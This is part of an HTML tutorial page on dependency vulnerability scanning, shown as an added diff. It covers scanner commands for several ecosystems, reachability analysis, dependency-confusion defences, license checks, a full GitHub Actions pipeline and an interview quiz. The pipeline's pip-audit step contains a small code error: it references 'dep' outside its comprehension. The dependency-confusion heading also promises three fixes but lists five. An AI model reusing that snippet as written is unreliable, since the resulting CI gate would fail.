+$ pip-audit -r requirements.txt --fix
+<span class="cm"># Rewrites requirements.txt with minimum patched versions</span>
+
+<span class="cm"># Parse results in CI:</span>
+<span class="cf">import</span> json, sys
+data = json.load(open(<span class="cs">'pip-audit.json'</span>))
+vulns = [v <span class="cf">for</span> dep <span class="cf">in</span> data[<span class="cs">'dependencies'</span>]
+         <span class="cf">for</span> v <span class="cf">in</span> dep[<span class="cs">'vulns'</span>]
+         <span class="cf">if</span> v.get(<span class="cs">'fix_versions'</span>)]   <span class="cm"># only fixable vulns</span>
+<span class="cf">if</span> vulns:
+    <span class="cf">for</span> v <span class="cf">in</span> vulns:
+        print(<span class="cs">f"  {v['id']}: {v['description'][:80]}"</span>)
+    sys.exit(<span class="ce">1</span>)
+</pre>
+    </div>
+
+    <!-- NODE.JS -->
+    <div class="tool-pane" id="t-node">
+      <p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;"><strong style="color:var(--ink)">npm audit</strong> is the built-in Node.js vulnerability scanner, querying the npm security advisory database. For additional coverage, <strong style="color:var(--ink)">Snyk</strong> and <strong style="color:var(--ink)">audit-ci</strong> add severity filtering and CI-specific exit codes. Yarn and pnpm have equivalent audit commands.</p>
+<pre>
+<span class="ctag">Node.js &mdash; npm audit</span>
+<span class="cm"># Run npm audit (reads package-lock.json)</span>
+$ npm audit
+
+<span class="cm"># JSON output</span>
+$ npm audit --json > npm-audit.json
+
+<span class="cm"># Only fail CI on high/critical (not moderate/low)</span>
+$ npm audit --audit-level=high
+<span class="cm"># Exit code 1 only if HIGH or CRITICAL vulns found</span>
+
+<span class="cm"># Auto-fix compatible updates</span>
+$ npm audit fix
+<span class="cm"># Upgrades to semver-compatible patched versions</span>
+<span class="cm"># NEVER run npm audit fix --force in production (breaks semver)</span>
+
+<span class="cm"># Yarn</span>
+$ yarn audit --level high
+
+<span class="cm"># pnpm</span>
+$ pnpm audit --audit-level high
+
+<span class="cm"># audit-ci: better CI integration with config file</span>
+$ npm install -g audit-ci
+$ cat .audit-ci.json
+{
+  "high": true,           <span class="cm">// fail on high and critical</span>
+  "allowlist": [
+    "GHSA-wrvr-8mpx-r7pp"  <span class="cm">// known false positive</span>
+  ]
+}
+$ audit-ci --config .audit-ci.json
+
+<span class="cm"># Parse npm audit JSON in CI:</span>
+HIGH=$(cat npm-audit.json | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+vulns=d.get('vulnerabilities',{})
+count=sum(1 for v in vulns.values()
+         if v.get('severity') in ['high','critical'])
+print(count)")
+[ "$HIGH" -eq "0" ] || { echo "HIGH/CRITICAL npm vulns: $HIGH"; exit 1; }
+</pre>
+    </div>
+
+    <!-- GO -->
+    <div class="tool-pane" id="t-go">
+      <p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;"><strong style="color:var(--ink)">govulncheck</strong> is the official Go vulnerability scanner from the Go team at Google. Unlike other scanners that report any CVE in any imported package, govulncheck performs <em>call graph analysis</em> &mdash; it only reports vulnerabilities in code your program actually calls. This dramatically reduces false positives.</p>
+<pre>
+<span class="ctag">Go &mdash; govulncheck</span>
+<span class="cm"># Install</span>
+$ go install golang.org/x/vuln/cmd/govulncheck@latest
+
+<span class="cm"># Scan all packages in module</span>
+$ govulncheck ./...
+
+<span class="cm"># Example output:</span>
+Vulnerability #1: GO-2023-1840
+    Incorrect sanitisation of "/" in net/http
+    More info: https://pkg.go.dev/vuln/GO-2023-1840
+    Module: stdlib
+    Found in: net/http@go1.20.3
+    Fixed in: go1.20.7
+    Call stacks in your code:
+        main.go:42:14 main.handleRequest
+            net/http.Redirect     <span class="cm"># ← actual call in YOUR code</span>
+
+<span class="cm"># govulncheck only reports this because your code calls http.Redirect
+# A different CVE in the same package that your code never calls
+# would NOT be reported. This is reachability analysis built-in.</span>
+
+<span class="cm"># JSON output for CI parsing</span>
+$ govulncheck -json ./... > govuln.json
+
+<span class="cm"># GitHub Actions:</span>
+- name: govulncheck
+  uses: golang/govulncheck-action@v1
+  with:
+    go-version-input: stable
+    check-latest: true
+</pre>
+    </div>
+
+    <!-- RUBY -->
+    <div class="tool-pane" id="t-ruby">
+      <p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;"><strong style="color:var(--ink)">bundler-audit</strong> is the standard Ruby gem vulnerability scanner. It checks your Gemfile.lock against the Ruby Advisory Database. <strong style="color:var(--ink)">bundle-audit</strong> also detects insecure gem sources (HTTP not HTTPS) and unpatched gems.</p>
+<pre>
+<span class="ctag">Ruby &mdash; bundler-audit</span>
+<span class="cm"># Install</span>
+$ gem install bundler-audit
+
+<span class="cm"># Update advisory database (always do this first)</span>
+$ bundle-audit update
+
+<span class="cm"># Scan Gemfile.lock</span>
+$ bundle-audit check
+
+<span class="cm"># Example output:</span>
+Name: actionpack
+Version: 7.0.4
+Advisory: CVE-2023-22795
+Criticality: High
+URL: https://github.com/advisories/GHSA-8xww-x3g3-6jcv
+Title: ReDoS in Action Dispatch header parsing
+Solution: upgrade to &gt;= 7.0.6.1
+
+<span class="cm"># Ignore a specific CVE</span>
+$ bundle-audit check --ignore CVE-2023-22795
+
+<span class="cm"># Fail CI only on high/critical</span>
+$ bundle-audit check
+<span class="cm"># Exit code 1 if ANY vulnerability found (filter in script)</span>
+$ bundle-audit check --format json | python3 -c "
+import json,sys
+data=json.load(sys.stdin)
+crit=[r for r in data.get('results',[])
+      if r.get('criticality') in ['High','Critical']]
+sys.exit(1 if crit else 0)"
+
+<span class="cm"># GitHub Actions</span>
+- run: |
+    gem install bundler-audit
+    bundle-audit update
+    bundle-audit check
+</pre>
+    </div>
+
+    <!-- .NET -->
+    <div class="tool-pane" id="t-dotnet">
+      <p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;"><strong style="color:var(--ink)">dotnet list package --vulnerable</strong> is the built-in .NET vulnerability scanner. It queries the NuGet security advisory database. For deeper analysis, <strong style="color:var(--ink)">OWASP Dependency-Check</strong> with the .NET analyzer handles legacy .NET Framework projects.</p>
+<pre>
+<span class="ctag">.NET &mdash; dotnet CLI</span>
+<span class="cm"># Scan for vulnerable packages (built into dotnet SDK 6+)</span>
+$ dotnet list package --vulnerable
+
+<span class="cm"># Include transitive dependencies</span>
+$ dotnet list package --vulnerable --include-transitive
+
+<span class="cm"># Example output:</span>
+Project `MyApp` has the following vulnerable packages
+   [net7.0]:
+   Top-level Package    Requested   Resolved   Severity   Advisory URL
+   &gt; Newtonsoft.Json    &lt;13.0.1     12.0.3     High       https://...
+
+<span class="cm"># JSON output for parsing</span>
+$ dotnet list package --vulnerable --include-transitive \
+    --format json > dotnet-vulns.json
+
+<span class="cm"># Fail CI on vulnerable packages:</span>
+$ dotnet list package --vulnerable --include-transitive 2&gt;&amp;1 | \
+    grep -q "has the following vulnerable packages" &amp;&amp; exit 1 || exit 0
+
+<span class="cm"># For .NET Framework (legacy): use OWASP Dependency-Check</span>
+$ dependency-check.sh \
+    --project "MyApp" \
+    --scan ./packages/ \
+    --format JSON \
+    --out ./dc-report/ \
+    --failOnCVSS 7
+</pre>
+    </div>
+
+    <!-- OWASP DC -->
+    <div class="tool-pane" id="t-odc">
+      <p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;"><strong style="color:var(--ink)">OWASP Dependency-Check</strong> is a multi-language scanner that works across Java, .NET, Python, JavaScript, Ruby, Go, and more. It uses CPE (Common Platform Enumeration) matching and queries the NVD directly. Best for polyglot projects and enterprise environments needing one tool for all ecosystems.</p>
+<pre>
+<span class="ctag">OWASP Dependency-Check</span>
+<span class="cm"># Docker-based run (no install needed)</span>
+$ docker run --rm \
+    -v $(pwd):/src \
+    -v $(pwd)/dc-report:/report \
+    owasp/dependency-check:latest \
+    --project "MyApp" \
+    --scan /src \
+    --format HTML,JSON,SARIF \
+    --out /report \
+    --failOnCVSS 7 \            <span class="cm"># fail on CVSS &gt;= 7.0</span>
+    --nvdApiKey $NVD_API_KEY     <span class="cm"># rate limit avoided with API key</span>
+
+<span class="cm"># Suppression file: document known false positives</span>
+<span class="cm"># dc-suppress.xml</span>
+&lt;suppressions&gt;
+  &lt;suppress&gt;
+    &lt;notes&gt;CVE-2023-1234: only affects Windows builds, we deploy on Linux&lt;/notes&gt;
+    &lt;cve&gt;CVE-2023-1234&lt;/cve&gt;
+  &lt;/suppress&gt;
+  &lt;suppress&gt;
+    &lt;notes&gt;spring-core: version mismatch in CPE. Ticket SEC-456.&lt;/notes&gt;
+    &lt;packageUrl regex="true"&gt;^pkg:maven/org\.springframework/spring\-core@.*$&lt;/packageUrl&gt;
+    &lt;cve&gt;CVE-2022-22965&lt;/cve&gt;
+  &lt;/suppress&gt;
+&lt;/suppressions&gt;
+
+<span class="cm"># GitHub Actions integration</span>
+- name: OWASP Dependency Check
+  uses: dependency-check/Dependency-Check_Action@main
+  with:
+    project: 'MyApp'
+    path: '.'
+    format: 'SARIF'
+    args: >
+      --failOnCVSS 7
+      --suppression dc-suppress.xml
+      --nvdApiKey ${{ secrets.NVD_API_KEY }}
+</pre>
+    </div>
+  </div>
+
+  <!-- SNYK -->
+  <div class="panel" id="pan-snyk">
+    <div class="panel-h" onclick="tp('pan-snyk')">
+      <div class="panel-dot" style="background:var(--purple)"></div>
+      <div class="panel-title">Snyk &mdash; the commercial multi-ecosystem scanner</div>
+      <div class="panel-sub">When to use Snyk over free tools, and how to configure it</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <p>Snyk is a commercial dependency scanner (free tier available) with a few advantages over free tools: its own curated vulnerability database (often ahead of NVD on disclosure timing), native IDE plugins for real-time feedback, a fix PR feature that opens GitHub PRs automatically, and a single tool that handles Python, Node.js, Java, Ruby, .NET, Go, and Docker images. The free tier covers open source projects.</p>
+<pre>
+<span class="ctag">Snyk</span>
+<span class="cm"># Install</span>
+$ npm install -g snyk
+
+<span class="cm"># Authenticate</span>
+$ snyk auth
+
+<span class="cm"># Test project (auto-detects ecosystem)</span>
+$ snyk test
+
+<span class="cm"># Test with severity threshold</span>
+$ snyk test --severity-threshold=high
+
+<span class="cm"># Output JSON for parsing</span>
+$ snyk test --json > snyk-results.json
+
+<span class="cm"># Monitor: upload snapshot to Snyk dashboard for continuous monitoring</span>
+$ snyk monitor
+<span class="cm"># Daily rescans against updated vuln DB even without new commits</span>
+
+<span class="cm"># GitHub Actions</span>
+- name: Snyk test
+  uses: snyk/actions/python@master
+  env:
+    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+  with:
+    args: >
+      --severity-threshold=high
+      --fail-on=upgradable      <span class="cm"># only fail if a patched version exists</span>
+
+<span class="cm"># Snyk .snyk policy file: document suppressions</span>
+version: v1.25.0
+ignore:
+  SNYK-PYTHON-PILLOW-3318218:
+    - '*':
+        reason: PIL.Image.open never called with user-controlled input
+        expires: '2024-12-01T00:00:00.000Z'
+        created: '2024-01-15T00:00:00.000Z'
+</pre>
+    </div>
+  </div>
+</div>
+<!-- ADVANCED: REACHABILITY -->
+<div class="section">
+  <div class="eyebrow">&#x1F534; Advanced &mdash; Reachability Analysis</div>
+  <div class="sec-title">Not every CVE in your dependency tree is exploitable</div>
+  <div class="sec-sub">Reachability analysis answers the question that raw CVE counts cannot: does your application actually execute the vulnerable code path? This is the difference between a real vulnerability and noise.</div>
+
+  <div class="callout cl-teal">
+    <div class="cl-icon">&#x1F4CC;</div>
+    <div class="cl-text"><strong>The reachability gap:</strong> A typical enterprise Python application has 150+ dependencies. A raw CVE scan will find 20-50 CVEs. Reachability analysis typically shows that only 3-8 of those have vulnerable code paths that your application actually invokes. Fixing 8 real issues instead of chasing 50 noisy ones is the operational difference reachability makes. But: "not reachable" is not the same as "safe" &mdash; code paths can change, and reachability analysis is a risk-reduction tool, not a suppression justification.</div>
+  </div>
+
+  <div class="panel" id="pan-reachability">
+    <div class="panel-h" onclick="tp('pan-reachability')">
+      <div class="panel-dot" style="background:var(--teal)"></div>
+      <div class="panel-title">How reachability analysis works</div>
+      <div class="panel-sub">Call graph analysis from your code to the vulnerable function</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+<pre>
+<span class="cm"># Example: Pillow (Python imaging library) has a heap overflow CVE</span>
+<span class="cm"># in PIL.JpegImagePlugin._getmp() when parsing JPEG files</span>
+<span class="cm">#</span>
+<span class="cm"># Without reachability analysis:</span>
+<span class="cm"># "You have Pillow 9.5.0. CVE-2023-44271 is HIGH. Fix immediately."</span>
+<span class="cm">#</span>
+<span class="cm"># With reachability analysis:</span>
+<span class="cm"># "CVE-2023-44271 is in PIL.JpegImagePlugin._getmp()</span>
+<span class="cm">#  Scanning your codebase for calls to Pillow functions..."</span>
+<span class="cm">#</span>
+<span class="cm"># Your code:</span>
+<span class="cf">from</span> PIL <span class="cf">import</span> Image
+<span class="cf">def</span> <span class="cg">make_thumbnail</span>(url: str):
+    img = Image.open(requests.get(url, stream=<span class="ck">True</span>).raw)
+    img.thumbnail((<span class="ce">200</span>, <span class="ce">200</span>))
+    <span class="cf">return</span> img
+<span class="cm">#</span>
+<span class="cm"># Reachability check: does your code call PIL.JpegImagePlugin._getmp()?</span>
+<span class="cm"># Image.open() with a JPEG DOES call _getmp() internally.</span>
+<span class="cm"># AND your code opens user-supplied URLs (user-controlled input).</span>
+<span class="cm"># Result: REACHABLE. Priority: HIGH. Fix urgently.</span>
+<span class="cm">#</span>
+<span class="cm"># But if your code was:</span>
+<span class="cf">from</span> PIL <span class="cf">import</span> Image
+<span class="cf">def</span> <span class="cg">resize_internal_asset</span>(path: str):
+    img = Image.open(path)        <span class="cm"># only ever opens trusted internal PNGs</span>
+    img = img.convert(<span class="cs">'RGB'</span>)
+    <span class="cf">return</span> img
+<span class="cm">#</span>
+<span class="cm"># JPEG plugin never called. Input not user-controlled.</span>
+<span class="cm"># Result: NOT REACHABLE via current code paths.</span>
+<span class="cm"># Action: still upgrade, but not an emergency blocker.</span>
+</pre>
+      <h4>Tools that provide reachability analysis</h4>
+      <table>
+        <tr><th>Tool</th><th>Ecosystem</th><th>How it works</th><th>Accuracy</th></tr>
+        <tr><td style="font-weight:700;color:var(--teal)">govulncheck</td><td>Go</td><td>Built-in call graph analysis against Go vuln DB. Official Go tool.</td><td>High &mdash; static call graph is accurate in Go</td></tr>
+        <tr><td style="font-weight:700;color:var(--purple)">Snyk (Code)</td><td>Python, JS, Java</td><td>Combines SCA + SAST to trace data flow from entry point to vulnerable function</td><td>Medium-High &mdash; best commercial option</td></tr>
+        <tr><td style="font-weight:700;color:var(--accent)">Semgrep Supply Chain</td><td>Python, JS, Ruby, Java</td><td>Matches CVE fix patterns against your code. Shows if you call the patched function.</td><td>Medium &mdash; pattern-based, not full call graph</td></tr>
+        <tr><td style="font-weight:700;color:var(--green)">pip-audit + manual</td><td>Python</td><td>pip-audit finds the CVE; you manually check if the vulnerable function is in your call graph</td><td>Depends on engineer &mdash; accurate but time-consuming</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ADVANCED: DEPENDENCY CONFUSION -->
+<div class="section">
+  <div class="eyebrow">&#x1F534; Advanced &mdash; Dependency Confusion Attacks</div>
+  <div class="sec-title">When attackers publish malicious packages with your private package names</div>
+  <div class="sec-sub">Dependency confusion is a supply chain attack that exploits how package managers resolve public vs private packages. Understanding it is essential for any team using private registries.</div>
+
+  <div class="panel" id="pan-confusion">
+    <div class="panel-h" onclick="tp('pan-confusion')">
+      <div class="panel-dot" style="background:var(--pink)"></div>
+      <div class="panel-title">How dependency confusion works &mdash; and three ways to stop it</div>
+      <div class="panel-sub">Discovered by Alex Birsan in 2021, affected Apple, Microsoft, Tesla, and 35+ companies</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <p>Companies maintain private package registries (npm, PyPI, Artifactory) for internal packages. Package managers by default check public registries too. If a company has a private package called <code>mycompany-utils</code> and an attacker publishes a package with the same name to public PyPI or npmjs.com with a higher version number, the package manager may prefer the public (malicious) version. Alex Birsan found this affected 35+ major companies in 2021 and collected over $130,000 in bug bounties.</p>
+<pre>
+<span class="cm"># The attack:</span>
+<span class="cm"># 1. Attacker finds your internal package name (from job postings,</span>
+<span class="cm">#    GitHub leak, requirements.txt in public repo, error messages)</span>
+<span class="cm"># 2. Publishes malicious package with same name on public PyPI</span>
+<span class="cm">#    with version 9999.0.0 (higher than your internal version)</span>
+<span class="cm"># 3. Your pip install --extra-index-url https://private.reg/simple</span>
+<span class="cm">#    resolves to public PyPI version 9999.0.0 (higher version wins)</span>
+<span class="cm"># 4. Malicious package executes on install, data exfiltration begins</span>
+
+<span class="cm"># ── Fix 1: Use --index-url, not --extra-index-url ────────────────</span>
+<span class="cm"># --extra-index-url checks BOTH registries and takes highest version</span>
+<span class="lb">pip install --extra-index-url https://private.reg/simple mycompany-utils</span>
+<span class="cm"># --index-url REPLACES the default registry (no public fallback)</span>
+<span class="lg">pip install --index-url https://private.reg/simple mycompany-utils</span>
+
+<span class="cm"># ── Fix 2: Namespace your private packages ───────────────────────</span>
+<span class="cm"># Public PyPI has no package called @mycompany/utils (scoped names)</span>
+<span class="cm"># npm: use scoped packages</span>
+<span class="lg">@mycompany/utils   <span class="cm"># scoped to @mycompany namespace</span></span>
+<span class="cm"># PyPI: use organisation prefix</span>
+<span class="lg">mycompany-utils-internal  <span class="cm"># unlikely to be registered on public PyPI</span></span>
+
+<span class="cm"># ── Fix 3: Register your package names on public PyPI/npm ─────────</span>
+<span class="cm"># Publish placeholder packages to "claim" the name</span>
+<span class="cm"># Placeholder has no code, just a README explaining it's internal</span>
+<span class="cm"># Attacker can no longer register the same name</span>
+
+<span class="cm"># ── Fix 4: Artifactory virtual repos with priority ─────────────────</span>
+<span class="cm"># Artifactory can be configured so local/private repo has priority</span>
+<span class="cm"># over proxied public repo, regardless of version numbers</span>
+
+<span class="cm"># ── Fix 5: Hash pinning in requirements.txt ─────────────────────</span>
+<span class="lg">mycompany-utils==2.1.0 \</span>
+<span class="lg">    --hash=sha256:abc123...   <span class="cm"># only this exact hash is accepted</span></span>
+<span class="cm"># Even if attacker publishes version 2.1.0 to public PyPI,</span>
+<span class="cm"># the hash won't match &rarr; install rejected</span>
+</pre>
+      <div class="pill-row"><span class="pill pk">Supply chain attack</span><span class="pill py">Use --index-url not --extra-index-url</span><span class="pill pg">Namespace packages</span><span class="pill pg">Hash pin</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ADVANCED: LICENSE COMPLIANCE -->
+<div class="section">
+  <div class="eyebrow">&#x1F534; Advanced &mdash; License Compliance</div>
+  <div class="sec-title">Open source licenses and when they become a legal problem</div>
+  <div class="sec-sub">Using a GPL dependency in a proprietary product can require you to open-source your entire codebase. Scanning for license compatibility is part of responsible dependency management.</div>
+
+  <div class="panel" id="pan-licenses">
+    <div class="panel-h" onclick="tp('pan-licenses')">
+      <div class="panel-dot" style="background:var(--orange)"></div>
+      <div class="panel-title">License categories and the dependency risk each poses</div>
+      <div class="panel-sub">From permissive (safe) to copyleft (potential open-source obligation)</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <table>
+        <tr><th>License type</th><th>Examples</th><th>Commercial use</th><th>Must open source your code?</th><th>Risk for proprietary apps</th></tr>
+        <tr><td style="font-weight:700;color:var(--green)">Permissive</td><td>MIT, Apache 2.0, BSD 2/3-Clause, ISC</td><td>Yes</td><td>No</td><td style="color:var(--green)">Low &mdash; use freely, credit required</td></tr>
+        <tr><td style="font-weight:700;color:var(--yellow)">Weak copyleft</td><td>LGPL, MPL 2.0, CDDL</td><td>Yes</td><td>Only if you modify the library itself</td><td style="color:var(--yellow)">Medium &mdash; dynamic linking usually safe</td></tr>
+        <tr><td style="font-weight:700;color:var(--red)">Strong copyleft</td><td>GPL v2, GPL v3, AGPL</td><td>Yes (with conditions)</td><td>Yes, if distributed linked together</td><td style="color:var(--red)">High &mdash; can require opening your codebase</td></tr>
+        <tr><td style="font-weight:700;color:var(--red)">Network copyleft</td><td>AGPL v3</td><td>Yes (with conditions)</td><td>Yes, even if only used over a network</td><td style="color:var(--red)">Critical &mdash; SaaS usage can trigger copyleft</td></tr>
+        <tr><td style="font-weight:700;color:var(--orange)">Commercial</td><td>Custom EULA, BSL 1.1</td><td>Depends on terms</td><td>N/A</td><td style="color:var(--orange)">High &mdash; may have usage restrictions</td></tr>
+      </table>
+<pre>
+<span class="ctag">license scanning tools</span>
+<span class="cm"># pip-licenses: Python license inventory</span>
+$ pip install pip-licenses
+$ pip-licenses --format=markdown --order=license
+| Name              | Version | License          |
+|-------------------|---------|-----------------|
+| Django            | 4.2.3   | BSD License      |
+| celery            | 5.3.1   | BSD License      |
+| cryptography      | 41.0.3  | Apache Software  |
+| PyYAML            | 6.0.1   | MIT License      |
+
+<span class="cm"># Fail CI if GPL or AGPL found in a proprietary project</span>
+$ pip-licenses --format=json | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+blocked = ['GNU General Public License v3', 'GNU Affero General Public License v3',
+           'GNU General Public License v2']
+violations = [p for p in data if p.get('License') in blocked]
+if violations:
+    for v in violations:
+        print(f'LICENSE VIOLATION: {v[\"Name\"]} is {v[\"License\"]}')
+    sys.exit(1)"
+
+<span class="cm"># license-checker: Node.js license scanning</span>
+$ npx license-checker \
+    --onlyAllow "MIT;BSD-2-Clause;BSD-3-Clause;Apache-2.0;ISC" \
+    --excludePrivatePackages
+
+<span class="cm"># FOSSA: enterprise license compliance (commercial)</span>
+<span class="cm"># Integrates with GitHub/GitLab, scans all ecosystems, legal review workflows</span>
+</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ADVANCED: FULL PIPELINE -->
+<div class="section">
+  <div class="eyebrow">&#x1F534; Advanced &mdash; Full Automated Pipeline</div>
+  <div class="sec-title">Complete dependency scanning pipeline with GitHub Actions and Dependabot</div>
+  <div class="sec-sub">Two complementary mechanisms: Dependabot handles continuous monitoring and automated PRs, while CI scanning gates every PR against new introductions.</div>
+
+  <div class="panel" id="pan-dependabot">
+    <div class="panel-h" onclick="tp('pan-dependabot')">
+      <div class="panel-dot" style="background:var(--accent)"></div>
+      <div class="panel-title">Dependabot &mdash; automatic dependency update PRs</div>
+      <div class="panel-sub">GitHub-native continuous monitoring that opens PRs when vulnerabilities are found</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+<pre>
+<span class="ctag">.github/dependabot.yml</span>
+version: 2
+updates:
+  <span class="cm"># Python dependencies</span>
+  - package-ecosystem: pip
+    directory: /
+    schedule:
+      interval: weekly
+      day: monday
+      time: "09:00"
+      timezone: UTC
+    open-pull-requests-limit: 10
+    reviewers: [security-team]
+    labels: [dependencies, security]
+    <span class="cm"># Group minor/patch updates to reduce PR noise</span>
+    groups:
+      python-minor:
+        patterns: ["*"]
+        update-types: ["minor", "patch"]
+
+  <span class="cm"># Node.js dependencies</span>
+  - package-ecosystem: npm
+    directory: /frontend
+    schedule: { interval: weekly }
+    open-pull-requests-limit: 10
+
+  <span class="cm"># GitHub Actions versions</span>
+  - package-ecosystem: github-actions
+    directory: /
+    schedule: { interval: weekly }
+
+  <span class="cm"># Docker base images</span>
+  - package-ecosystem: docker
+    directory: /
+    schedule: { interval: weekly }
+</pre>
+      <h4>Dependabot security alerts vs version updates</h4>
+      <table>
+        <tr><th>Feature</th><th>Security alerts</th><th>Version updates</th></tr>
+        <tr><td>What triggers it</td><td>New CVE published for a package you use</td><td>New version of a package you use released</td></tr>
+        <tr><td>Action taken</td><td>Opens PR with minimum fix version</td><td>Opens PR with latest compatible version</td></tr>
+        <tr><td>Configuration needed</td><td>None (auto-enabled for public repos)</td><td>dependabot.yml required</td></tr>
+        <tr><td>Where to enable</td><td>Settings &rarr; Security &rarr; Dependabot alerts</td><td>Settings &rarr; Security &rarr; Dependabot version updates</td></tr>
+        <tr><td>Merge recommendation</td><td>Merge promptly (security fix)</td><td>Review and test first (may have breaking changes)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-pipeline">
+    <div class="panel-h" onclick="tp('pan-pipeline')">
+      <div class="panel-dot" style="background:var(--green)"></div>
+      <div class="panel-title">Complete GitHub Actions dependency scanning pipeline</div>
+      <div class="panel-sub">Every ecosystem, two scan triggers (PR gate + daily scheduled), SARIF upload</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+<pre>
+<span class="ctag">.github/workflows/dependency-scan.yml</span>
+name: Dependency Scanning
+
+on:
+  pull_request: { branches: [main, staging] }
+  push: { branches: [main] }
+  schedule:
+    - cron: <span class="cs">'0 6 * * *'</span>   <span class="cm"># daily 06:00 UTC &mdash; catches new CVEs in existing deps</span>
+
+jobs:
+  <span class="cm"># ── Python (pip-audit) ───────────────────────────────────────────</span>
+  python-sca:
+    name: Python SCA
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: { python-version: <span class="cs">'3.12'</span> }
+      - run: pip install pip-audit
+      - name: pip-audit scan
+        run: |
+          pip-audit -r requirements.lock \
+            --format json --output pip-audit.json \
+            --ignore-vuln PYSEC-2022-237         <span class="cm"># documented false positive</span>
+          python3 -c "
+          import json, sys
+          data = json.load(open('pip-audit.json'))
+          fixable = [v for dep in data.get('dependencies',[])
+                     for v in dep.get('vulns',[])
+                     if v.get('fix_versions')]
+          for v in fixable: print(f'  {v[\"id\"]} in {dep[\"name\"]}')
+          sys.exit(1 if fixable else 0)"
+
+  <span class="cm"># ── Node.js (npm audit) ──────────────────────────────────────────</span>
+  node-sca:
+    name: Node.js SCA
+    runs-on: ubuntu-latest
+    defaults:
+      run: { working-directory: ./frontend }
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: <span class="cs">'20'</span> }
+      - run: npm ci
+      - name: npm audit
+        run: npm audit --audit-level=high --json > ../npm-audit.json || true
+      - name: Enforce gate
+        run: |
+          HIGH=$(cat ../npm-audit.json | python3 -c "
+          import json,sys; d=json.load(sys.stdin)
+          v=d.get('vulnerabilities',{})
+          print(sum(1 for x in v.values()
+                    if x.get('severity') in ['high','critical']))")
+          echo "High/Critical: $HIGH"
+          [ "$HIGH" -eq "0" ] || exit 1
+
+  <span class="cm"># ── Go (govulncheck) ─────────────────────────────────────────────</span>
+  go-sca:
+    name: Go SCA
+    runs-on: ubuntu-latest
+    if: hashFiles('go.sum') != ''    <span class="cm"># only if project has Go</span>
+    steps:
+      - uses: actions/checkout@v4
+      - uses: golang/govulncheck-action@v1
+        with: { go-version-input: stable }
+
+  <span class="cm"># ── Snyk (multi-ecosystem, daily monitoring) ─────────────────────</span>
+  snyk-monitor:
+    name: Snyk Monitor
+    runs-on: ubuntu-latest
+    if: github.ref == 'refs/heads/main'   <span class="cm"># only on main branch</span>
+    steps:
+      - uses: actions/checkout@v4
+      - uses: snyk/actions/python@master
+        env: { SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }} }
+        with:
+          command: monitor            <span class="cm"># upload snapshot for continuous monitoring</span>
+          args: --project-name=myapp-prod
+
+  <span class="cm"># ── License compliance ───────────────────────────────────────────</span>
+  license-check:
+    name: License Compliance
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: { python-version: <span class="cs">'3.12'</span> }
+      - run: pip install pip-licenses -r requirements.lock
+      - name: Check for GPL/AGPL
+        run: |
+          pip-licenses --format=json | python3 -c "
+          import json, sys
+          data = json.load(sys.stdin)
+          blocked = ['GNU General Public License v3 (GPLv3)',
+                     'GNU Affero General Public License v3 (AGPLv3)',
+                     'GNU General Public License v2 (GPLv2)']
+          violations = [p for p in data if any(b in p.get('License','') for b in blocked)]
+          for v in violations:
+              print(f'LICENSE BLOCK: {v[\"Name\"]} ({v[\"License\"]})')
+          sys.exit(1 if violations else 0)"
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: dependency-reports
+          path: "*.json"
+</pre>
+    </div>
+  </div>
+</div>
+<!-- QUIZ -->
+<div class="section">
+  <div class="eyebrow">Knowledge Check</div>
+  <div class="sec-title">Dependency scanning interview questions</div>
+  <div class="sec-sub">Questions that come up regularly in AppSec engineer and DevSecOps interviews.</div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q1. Your dependency scanner reports a CVSS 9.8 CRITICAL vulnerability in a transitive dependency. A developer says "we don't call that library directly so we don't need to fix it." How do you respond?</div>
+    <div class="quiz-opts" id="q1">
+      <div class="qo" onclick="doQ('q1',this,'wrong')">The developer is correct &mdash; if the code is not called directly, the vulnerability is not exploitable</div>
+      <div class="qo" onclick="doQ('q1',this,'wrong')">The developer is correct, but it's good practice to fix it anyway when convenient</div>
+      <div class="qo" onclick="doQ('q1',this,'correct')">The developer is partly right that reachability matters, but "not called directly" is not the same as "not reachable." You need to verify: (1) Is the vulnerable function in the transitive dep's call path when your direct dep uses it? (2) Is user input involved in that call path? (3) Can the code path change? The appropriate response is to run reachability analysis, document the assessment, and still upgrade the transitive dep when a fix is available &mdash; because transitive deps are your responsibility regardless.</div>
+      <div class="qo" onclick="doQ('q1',this,'wrong')">Escalate to the CISO immediately &mdash; all CRITICAL CVEs must be fixed within 24 hours with no exceptions</div>
+    </div>
